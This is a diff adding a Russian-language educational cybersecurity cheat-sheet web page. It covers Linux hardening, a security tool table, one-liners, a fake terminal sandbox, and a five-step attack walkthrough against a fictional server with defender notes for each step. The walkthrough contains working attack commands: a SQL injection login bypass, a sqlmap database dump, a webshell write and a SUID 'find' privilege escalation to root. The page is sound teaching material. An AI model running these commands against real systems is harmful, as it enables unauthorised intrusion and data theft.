+          эксплуатируется.</p>
+
+        <div class="why-grid">
+          <div class="why-box"><span class="wb-title">Зачем это нужно (на пальцах)</span>Каждый открытый порт — дверь.
+            Каждый слабый пароль — ключ в кармане. Hardening = убрать лишние двери и усложнить замки.</div>
+          <div class="why-box"><span class="wb-title">Аналогия</span>Охрана: firewall — ворота, fail2ban — охранник с
+            камерой (видит попытки взлома), логи — записи в журнале посещений. Если журнал пуст — либо всё спокойно,
+            либо атакующий его удалил.</div>
+          <div class="why-box warn"><span class="wb-title">Что будет, если проигнорировать</span>Первый же сканер в
+            интернете найдёт твой SSH за минуты. Без fail2ban и патчей сервер «снимут» до того, как ты о нём вспомнишь.
+          </div>
+          <div class="why-box"><span class="wb-title">Самое важное</span>
+            <ul class="clean" style="margin:0">
+              <li>Минимум открытых портов (default deny).</li>
+              <li>Автоматические патчи + fail2ban на SSH.</li>
+              <li>Логи — всегда, и выводить их наружу.</li>
+            </ul>
+          </div>
+        </div>
+
+        <article class="card cmd-card" id="cmd-ufw" data-tags="defense hardening network">
+          <div class="cmd-head">
+            <h3>ufw — файрвол (простой интерфейс)</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">sudo ufw default deny incoming
+sudo ufw allow 22/tcp        # SSH
+sudo ufw allow 443/tcp       # HTTPS
+sudo ufw enable
+sudo ufw status verbose</pre>
+          <p class="cmd-note">Принцип: всё запрещать по умолчанию, открывать точечно. <code>default deny incoming</code>
+            — первая команда на любом новом сервере.</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link"
+              data-tag="hardening">#hardening</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-iptables" data-tags="defense hardening network">
+          <div class="cmd-head">
+            <h3>iptables — низкоуровневый файрвол</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
+sudo iptables -A INPUT -i lo -j ACCEPT
+sudo iptables -P INPUT DROP
+# Лимит попыток SSH (5 новых соединений/минуту с IP):
+sudo iptables -A INPUT -p tcp --dport 22 -m recent --set name=SSH
+sudo iptables -A INPUT -p tcp --dport 22 -m recent --update --seconds 60 --hitcount 6 -j DROP</pre>
+          <p class="cmd-note">iptables — «сырой» уровень (ufw поверх него). Правила читаются сверху вниз; порядок важен.
+            Для персистентности: <code>apt install iptables-persistent</code>.</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link"
+              data-tag="hardening">#hardening</span></div>
+        </article>
+
+        <article class="card cmd-card" id="cmd-journalctl" data-tags="defense logs processes">
+          <div class="cmd-head">
+            <h3>journalctl — анализ системных логов</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">sudo journalctl -xe                     # последние ошибки + контекст
+sudo journalctl -u sshd --since "1 hour ago"   # только SSH за час
+sudo journalctl -k | grep -i error      # логи ядра
+journalctl --list-boots                 # история загрузок</pre>
+          <p class="cmd-note">systemd-journald — центральный журнал. При инциденте: сначала <code>-xe</code>, затем
+            сужать по сервису (<code>-u</code>) и времени (<code>--since/--until</code>).</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link"
+              data-tag="logs">#logs</span></div>
+        </article>
+
+        <h3 style="margin:28px 0 14px">Чеклист базового hardening Linux-сервера</h3>
+        <div class="card checklist-card">
+          <ul class="checklist">
+            <li><b>Патчи:</b> <code>apt update &amp;&amp; apt full-upgrade -y</code> + unattended-upgrades
+              (автообновление безопасности).</li>
+            <li><b>SSH:</b> запрет root-входа (<code>PermitRootLogin no</code>), ключи вместо паролей, смена порта —
+              опционально.</li>
+            <li><b>fail2ban:</b> jail для sshd (бан после 3 неудачных попыток) + jail для веб-логинов.</li>
+            <li><b>Файрвол:</b> ufw default deny incoming; открыты только 22/443 (+ что нужно).</li>
+            <li><b>Пользователи:</b> без пароля у root, sudo только для нужных команд (<code>/etc/sudoers.d</code>),
+              никаких SUID «на всякий случай».</li>
+            <li><b>Логи:</b> journald + rsyslog на внешний сервер (атакующий не удалит то, что уже улетело).</li>
+            <li><b>Мониторинг:</b> алерт на новые root-сессии, изменения в /etc/passwd, запуск неизвестных бинарников.
+            </li>
+          </ul>
+        </div>
+
+        <div class="callout qa"><span class="co-title">Частый вопрос новичка</span>«ufw или iptables?» Для 90% задач —
+          ufw (читается человеком). iptables нужен, когда нужны тонкие правила: rate-limiting по IP, NAT, сложные
+          цепочки.</div>
+        <div class="callout err"><span class="co-title">Типичная ошибка</span>Закрыть SSH в файрволе и забыть про IP —
+          потом «спасает» только консоль у провайдера. Всегда держи второй канал доступа (VPN, облачная консоль) до
+          того, как ужесточать правила.</div>
+      </section>
+
+      <!--SEC-tools-->
+      <section class="block" id="tools">
+        <div class="sec-head"><span class="sec-num">07</span>
+          <h2 class="sec-title">Полезные инструменты</h2>
+        </div>
+        <p class="sec-sub">Ящик с инструментами: что для чего, когда брать.</p>
+
+        <table class="simple tools-table">
+          <tr>
+            <th>Инструмент</th>
+            <th>Назначение</th>
+            <th>Когда использовать</th>
+          </tr>
+          <tr>
+            <td><b>nmap / masscan</b></td>
+            <td>Сканирование портов, сервисов, ОС</td>
+            <td>Начало любой работы с целью</td>
+          </tr>
+          <tr>
+            <td><b>gobuster / ffuf</b></td>
+            <td>Перебор директорий, файлов, поддоменов</td>
+            <td>Веб-разведка: ищем «скрытые двери»</td>
+          </tr>
+          <tr>
+            <td><b>dig / whois / subfinder</b></td>
+            <td>DNS/OSINT-разведка</td>
+            <td>Пассивный сбор до атаки</td>
+          </tr>
+          <tr>
+            <td><b>hydra</b></td>
+            <td>Брутфорс сетевых сервисов (SSH, FTP, HTTP…)</td>
+            <td>Подбор учётных данных</td>
+          </tr>
+          <tr>
+            <td><b>hashcat / john</b></td>
+            <td>Взлом хэшей паролей (GPU/CPU)</td>
+            <td>Есть дамп: БД, /etc/shadow, NTLM</td>
+          </tr>
+          <tr>
+            <td><b>sqlmap</b></td>
+            <td>Автоматизация SQLi</td>
+            <td>Подтверждена инъекция — добиваем</td>
+          </tr>
+          <tr>
+            <td><b>Burp Suite / OWASP ZAP</b></td>
+            <td>Веб-сканирование, перехват трафика (MITM)</td>
+            <td>Аудит веб-приложений</td>
+          </tr>
+          <tr>
+            <td><b>Metasploit</b></td>
+            <td>Фреймворк эксплойтов + шеллы</td>
+            <td>Когда нужен готовый exploit/payload</td>
+          </tr>
+          <tr>
+            <td><b>linpeas / linenum</b></td>
+            <td>Аудит Linux на пути к root</td>
+            <td>После получения доступа</td>
+          </tr>
+          <tr>
+            <td><b>wireshark / tcpdump</b></td>
+            <td>Анализ сетевого трафика</td>
+            <td>MITM, расследование, дебаг протоколов</td>
+          </tr>
+          <tr>
+            <td><b>fail2ban / ufw / auditd</b></td>
+            <td>Защита: бан атакующих, файрвол, аудит действий</td>
+            <td>Hardening любого сервера</td>
+          </tr>
+          <tr>
+            <td><b>The Hacker Choice / Kali Linux</b></td>
+            <td>Distro с готовым набором инструментов</td>
+            <td>Лаборатория и полевая работа</td>
+          </tr>
+        </table>
+
+        <div class="callout qa"><span class="co-title">Частый вопрос новичка</span>«Скачивать все инструменты сразу?»
+          Нет. Инструменты — как молотки: сначала научись держать один (nmap + grep + ssh), потом добавляй под задачи.
+          Коллекционирование софта без понимания — путь в тупик.</div>
+      </section>
+
+      <!--SEC-oneliners-->
+      <section class="block" id="oneliners">
+        <div class="sec-head"><span class="sec-num">08</span>
+          <h2 class="sec-title">Быстрые шпаргалки / One-liners</h2>
+        </div>
+        <p class="sec-sub">Мощные однострочники. Копируй, сохраняй в избранное (★), выгружай в .txt/.md.</p>
+
+        <article class="card cmd-card" id="one-1" data-tags="linux logs">
+          <div class="cmd-head">
+            <h3>Топ процессов по памяти</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">ps aux --sort=-%mem | head -n 10</pre>
+          <p class="cmd-note">Кто «съедает» RAM — за секунду.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="processes">#processes</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-2" data-tags="linux files">
+          <div class="cmd-head">
+            <h3>Размер каталогов (топ-10)</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">du -sh /var/* 2&gt;/dev/null | sort -rh | head -n 10</pre>
+          <p class="cmd-note">Где кончилось место на диске.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="files">#files</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-3" data-tags="linux network">
+          <div class="cmd-head">
+            <h3>Кто слушает порты + PID</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">ss -tulnp | grep LISTEN</pre>
+          <p class="cmd-note">Список открытых сервисов с процессами (от root).</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="network">#network</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-4" data-tags="recon network">
+          <div class="cmd-head">
+            <h3>Быстрый скан: порты + версии</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">nmap -sV --top-ports 50 -oA scan target_ip</pre>
+          <p class="cmd-note"><b>-oA</b> — результат сразу в три формата (nmap/grep/xml) для дальнейшего анализа.</p>
+          <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
+              data-tag="network">#network</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-5" data-tags="linux logs">
+          <div class="cmd-head">
+            <h3>Неудачные SSH-входы за сутки</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre
+            class="code">sudo journalctl -u sshd --since "24 hours ago" | grep "Failed password" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head</pre>
+          <p class="cmd-note">Топ IP, которые брутфорсят твой SSH. Дальше — fail2ban или бан в файрволе.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="logs">#logs</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-6" data-tags="attack privesc linux">
+          <div class="cmd-head">
+            <h3>СUID + sudo за один проход</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">(sudo -l 2&gt;/dev/null; find / -perm -4000 -type f 2&gt;/dev/null) | tee privesc.txt</pre>
+          <p class="cmd-note">Два главных вектора LPE в одном файле для анализа.</p>
+          <div class="tags"><span class="tag-link" data-tag="attack">#attack</span><span class="tag-link"
+              data-tag="privesc">#privesc</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-7" data-tags="linux files">
+          <div class="cmd-head">
+            <h3>Файлы, изменённые за последние 24 часа</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre class="code">find /etc /var/www -mtime -1 -type f 2&gt;/dev/null | xargs ls -la</pre>
+          <p class="cmd-note">Ищет следы атакующего: изменённые конфиги и веб-файлы (webshells).</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="files">#files</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-8" data-tags="defense logs">
+          <div class="cmd-head">
+            <h3>Все root-сессии за неделю</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre
+            class="code">sudo journalctl --since "7 days ago" | grep -E "session opened for user root|Accepted publickey.*root"</pre>
+          <p class="cmd-note">Кто и когда входил под root — базовая проверка при расследовании.</p>
+          <div class="tags"><span class="tag-link" data-tag="defense">#defense</span><span class="tag-link"
+              data-tag="logs">#logs</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-9" data-tags="linux network">
+          <div class="cmd-head">
+            <h3>Активные соединения с внешним миром</h3><span class="diff diff-pro">Продвинутый</span>
+          </div>
+          <pre
+            class="code">ss -tnp state established | grep -v "127.0.0" | awk '{print $4, $5}' | sort | uniq -c | sort -rn | head</pre>
+          <p class="cmd-note">Подозрительные исходящие соединения (C2-каналы) — по частоте и адресам.</p>
+          <div class="tags"><span class="tag-link" data-tag="linux">#linux</span><span class="tag-link"
+              data-tag="network">#network</span></div>
+        </article>
+
+        <article class="card cmd-card" id="one-10" data-tags="recon web">
+          <div class="cmd-head">
+            <h3>Быстрый перебор директорий</h3><span class="diff diff-base">База</span>
+          </div>
+          <pre class="code">ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404</pre>
+          <p class="cmd-note"><b>-fc 404</b> — отбросить страницы «не найдено», оставить только реальные.</p>
+          <div class="tags"><span class="tag-link" data-tag="recon">#recon</span><span class="tag-link"
+              data-tag="web">#web</span></div>
+        </article>
+
+        <div class="callout err"><span class="co-title">Типичная ошибка</span>Копировать one-liner «на веру» в
+          продакшен. Сначала прочитай, что делает каждый флаг: <code>find / -mtime -1 | xargs rm</code> — та же
+          конструкция, но уже инцидент.</div>
+      </section>
+
+      <!--SEC-sandbox-->
+      <section class="block" id="sandbox">
+        <div class="sec-head"><span class="sec-num">09</span>
+          <h2 class="sec-title">Песочница: терминал-эмулятор</h2>
+        </div>
+        <p class="sec-sub">Безопасный тренажёр: команды выполняются локально в браузере с фейковым выводом. Ничего не
+          отправляется наружу, ничего не ломается. Попробуй базовые команды из раздела Linux.</p>
+
+        <div class="sandbox-hints">
+          <button type="button" class="hint-chip" data-cmd="ls -la">ls -la</button>
+          <button type="button" class="hint-chip" data-cmd="cat /etc/passwd">cat /etc/passwd</button>
+          <button type="button" class="hint-chip" data-cmd='grep "Failed password" /var/log/auth.log'>grep "Failed
+            password" /var/log/auth.log</button>
+          <button type="button" class="hint-chip" data-cmd="find /tmp -name '*.sh'">find /tmp -name "*.sh"</button>
+          <button type="button" class="hint-chip" data-cmd="ps aux | grep sshd">ps aux | grep sshd</button>
+        </div>
+
+        <div class="terminal" id="sandboxTerminal">
+          <div class="term-head">
+            <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+            <span class="term-title">sandbox@cheatsheet: ~</span>
+            <button class="term-reset" id="termReset" title="Сбросить терминал">сброс</button>
+          </div>
+          <div class="term-body" id="termBody"></div>
+          <form class="term-input" id="termForm">
+            <span class="t-prompt" id="termPrompt">user@lab:~$</span>
+            <input type="text" id="termInput" autocomplete="off" spellcheck="false"
+              placeholder="Введи команду и нажми Enter (help — список)">
+          </form>
+        </div>
+
+        <p class="cmd-note">Поддерживаются:
+          <code>help, ls, cd, cat, pwd, whoami, id, uname, ps, ss, grep, find, chmod, history, clear</code>. Файловая
+          система — фейковая (несколько каталогов и файлов). Команды вне списка честно сообщают «command not found».</p>
+        <div class="callout qa"><span class="co-title">Частый вопрос новичка</span>«Это реальный Linux?» Нет — это
+          тренажёр для отработки мышечной памяти: синтаксис, флаги, пайплайны. Настоящая практика — в Docker-контейнере
+          или на VPS (только своих!).</div>
+      </section>
+
+      <!--SEC-scenario-->
+      <section class="block" id="scenario">
+        <div class="sec-head"><span class="sec-num">10</span>
+          <h2 class="sec-title">Сквозной сценарий: путь атаки глазами атакующего и защитника</h2>
+        </div>
+        <p class="sec-sub">Учебный пример на вымышленном сервере <code>shop.example.com (192.0.2.10)</code>. Каждый шаг
+          — что делает атакующий и что видит защитник в логах.</p>
+
+        <div class="scenario-step" id="sc-1">
+          <div class="sc-num">1</div>
+          <div class="sc-body">
+            <h3>Разведка: nmap + перебор директорий</h3>
+            <pre class="code">nmap -sV -sC 192.0.2.10
+# open  80/tcp   http    Apache/2.4.57 (Debian)
+# open  22/tcp   ssh     OpenSSH_9.2
+
+ffuf -u http://shop.example.com/FUZZ -w common.txt -fc 404
+# /admin          [301] -&gt; /admin/
+# /backup         [200]  (12 KB)</pre>
+            <div class="sc-defender"><b>Видит защитник:</b> в access.log — серия GET-запросов с одного IP, много 404.
+              Если настроен fail2ban/IDS — алерт «сканирование». Реакция: временно банить IP, проверить, что /backup не
+              отдаёт файлы.</div>
+          </div>
+        </div>
+
+        <div class="scenario-step" id="sc-2">
+          <div class="sc-num">2</div>
+          <div class="sc-body">
+            <h3>Доступ: SQLi в форме логина админки</h3>
+            <pre class="code"># Поле «Логин» в /admin/login.php:
+admin' --
+
+# sqlmap подтверждает:
+sqlmap -u "http://shop.example.com/admin/login.php?user=admin" --dbs
+# databases: information_schema, shop</pre>
+            <div class="sc-defender"><b>Видит защитник:</b> в access.log — запросы с подозрительными параметрами
+              (<code>%27</code>, <code>--</code>), аномально длинные строки. WAF (если есть) должен был заблокировать;
+              без WAF — только анализ логов и патч: prepared statements.</div>
+          </div>
+        </div>
+
+        <div class="scenario-step" id="sc-3">
+          <div class="sc-num">3</div>
+          <div class="sc-body">
+            <h3>Эксплуатация: дамп БД + webshell</h3>
+            <pre class="code">sqlmap -D shop -T users --dump
+# admin  $2y$10$N9qO8...   (bcrypt-хэш)
+
+# Через SQLi — запись webshell в /var/www/html/panel.php
+# Теперь у атакующего есть shell обычного пользователя www-data</pre>
+            <div class="sc-defender"><b>Видит защитник:</b> новый файл panel.php, созданный процессом apache2 (проверка:
+              <code>find /var/www -mtime -1</code>, мониторинг создания файлов). Реакция: удалить файл, закрыть SQLi,
+              сменить пароли БД.</div>
+          </div>
+        </div>
+
+        <div class="scenario-step" id="sc-4">
+          <div class="sc-num">4</div>
+          <div class="sc-body">
+            <h3>Persistence + разведка системы</h3>
+            <pre class="code">whoami; id            # www-data : www-data
+sudo -l               # (пусто — sudo не разрешено)
+find / -perm -4000 2&gt;/dev/null
+# /usr/bin/find       &lt;- SUID!
+
+cat /etc/passwd | grep -v nologin   # активные пользователи</pre>
+            <div class="sc-defender"><b>Видит защитник:</b> процесс apache2 запускает подозрительные команды
+              (auditd/sysmon-логи). Изменения в cron, новые ключи SSH — маркеры закрепления. Реакция: изолировать хост,
+              сохранить образ диска для расследования.</div>
+          </div>
+        </div>
+
+        <div class="scenario-step" id="sc-5">
+          <div class="sc-num">5</div>
+          <div class="sc-body">
+            <h3>Privilege Escalation: SUID find → root</h3>
+            <pre class="code">find / -exec /bin/sh \; -quit
+# id
+# uid=0(root) gid=0(root)</pre>
+            <div class="sc-defender"><b>Видит защитник:</b> в логах — смена UID процесса (auditd:
+              <code>syscall=openat ... uid=33 → euid=0</code>). Корневая причина: SUID-бит на /usr/bin/find, который не
+              нужен. Реакция: снять SUID (<code>chmod u-s /usr/bin/find</code>), найти вектор входа (SQLi), закрыть его.
+            </div>
+          </div>
+        </div>
+
+        <h3 class="group-title">Уроки из сценария</h3>
+        <div class="card">
+          <ul class="clean">
+            <li><b>Атакующий шёл по пути наименьшего сопротивления:</b> открытый /backup → SQLi в админке → SUID. Каждый
+              шаг был «подарком» конфигурации.</li>
+            <li><b>Защитник выигрывает не одним инструментом, а слоем:</b> WAF (шаг 2) + мониторинг файлов (шаг 3) +
+              auditd (шаг 5). Сработал бы любой слой — цепочка оборвалась.</li>
+            <li><b>Время реакции решает всё:</b> между шагами 1 и 5 у защитника были часы. Логи, которые никто не
+              читает, — это признание поражения заранее.</li>
+          </ul>
+        </div>
+      </section>
+
+      <!--SEC-resources-->
+      <section class="block" id="resources">
+        <div class="sec-head"><span class="sec-num">11</span>
+          <h2 class="sec-title">Литература и ресурсы</h2>
+        </div>
+        <p class="sec-sub">Куда расти дальше: книги, курсы, лаборатории.</p>
+
+        <div class="grid-2">
+          <div class="card">
+            <h3>Книги (база)</h3>
+            <ul class="clean">
+              <li><b>«The Art of Software Security Assessment»</b> — методология пентеста и оценки безопасности ПО.</li>
+              <li><b>The Web Application Hacker's Handbook</b> — классика веб-атак (старая, но фундамент).</li>
+              <li><b>Материалы LPIC-1/LPIC-2</b> — системная база Linux: администрирование, безопасность.</li>
+            </ul>
+          </div>
+          <div class="card">
+            <h3>Онлайн и практика</h3>
+            <ul class="clean">
+              <li><b>TryHackMe</b> — guided-пути для новичков (с Linux до пентеста).</li>
+              <li><b>Hack The Box</b> — машины посложнее, комьюнити.</li>
+              <li><b>OWASP Top 10 / Juice Shop</b> — веб-уязвимости и легальная лаба для них.</li>
+              <li><b>NVD (CVE Details)</b> — база уязвимостей: читай CVE как инструкцию «что сломано».</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <h3>Сертификации (ориентир)</h3>
+          <table class="simple">
+            <tr>
+              <th>Направление</th>
+              <th>Старт</th>
+              <th>Дальше</th>
+            </tr>
+            <tr>
+              <td>Red Team / пентест</td>
+              <td>eJPT, CompTIA PenTest+</td>
+              <td>OSCP (практика), CRTP</td>
+            </tr>
+            <tr>
+              <td>Blue Team / SOC</td>
+              <td>CompTIA Security+, BTL1</td>
+              <td>BTL2/BTL3, GCIA</td>
+            </tr>
+            <tr>
+              <td>AppSec</td>
+              <td>eWPT</td>
+              <td>OSWE (Java), GWAPT</td>
+            </tr>
+          </table>
+        </div>
+
+      </section>
+
+    </main>
+  </div><!-- /layout -->
+
+  <footer class="site-footer">
+    <p><b>CyberSec Cheat Sheet v1.0</b> — учебная памятка по кибербезопасности. Только для образовательных целей и
+      легальных лабораторий.</p>
+    <p>Сделано на чистом HTML/CSS/JS · данные (избранное, тема) хранятся локально в браузере</p>
+  </footer>
+
+  <!-- Избранное: модалка -->
+  <div class="modal-backdrop hidden" id="favModal">
+    <div class="modal">
+      <div class="modal-head">
+        <h3>★ Избранное (<span id="favCount2">0</span>)</h3>
+        <button class="icon-btn" id="favClose" title="Закрыть"><svg viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2">
+            <path d="M6 6l12 12M18 6L6 18" />
+          </svg></button>
+      </div>
+      <div class="modal-body" id="favList"></div>
+      <div class="modal-foot">
+        <button class="btn" id="exportTxt">Экспорт .txt</button>
+        <button class="btn" id="exportMd">Экспорт .md</button>
+        <button class="btn danger" id="favClear">Очистить всё</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast hidden" id="toast"></div>
+  <script src="script.js"></script>
+</body>
+
+</html>
